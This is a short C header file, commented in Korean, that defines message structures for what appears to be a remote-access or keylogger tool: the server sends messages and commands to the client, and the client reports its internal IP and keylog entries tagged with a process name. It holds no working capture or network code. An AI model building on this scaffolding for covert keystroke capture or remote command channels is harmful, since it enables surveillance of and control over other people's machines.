#pragma once

/* 프로토콜 정의 */

enum protocol {
	HELLO = 0,
	MESSAGE,
	COMMAND,
	KEYLOG
};

// Client -> Server
typedef struct PDUHello {
	char protocol_type; // HELLO
	char internal_ip[20];
} PDUHello;

// Server -> Client
typedef struct PDUMessage {
	char protocol_type; // MESSAGE
	WCHAR message[600];
} PDUMessage;

// Server -> Client
typedef struct PDUCommand {
	char protocol_type; // MESSAGE, COMMAND
	WCHAR command[110];
} PDUCommand;

// Client -> Server
typedef struct PDUKeylog {
	char protocol_type; // KEYLOG
	char state;
	WCHAR process_name[70];
} PDUKeylog;